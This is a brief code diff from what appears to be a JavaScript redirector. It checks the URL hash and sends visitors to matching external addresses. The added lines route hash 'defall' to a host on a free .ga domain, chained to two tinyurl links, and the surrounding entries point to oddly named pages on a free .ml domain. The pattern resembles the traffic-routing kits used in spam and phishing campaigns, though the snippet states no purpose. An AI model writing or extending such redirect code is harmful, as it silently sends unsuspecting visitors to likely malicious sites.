@@ -160,6 +160,10 @@ if (window.location.hash.substr(1)=='SIYae') {
  window.location.href='http://douci.ml/B2BIONIC.html';
  return;
 }
+if (window.location.hash.substr(1)=='defall') {
+ window.location.href='http://nialjestin.ga#http://tinyurl.com/bizing,http://tinyurl.com/dizing';
+ return;
+}
 if (window.location.hash.substr(1)=='d0ny4') {
  window.location.href='http://douci.ml/CRYAMELYON.html';
  return;
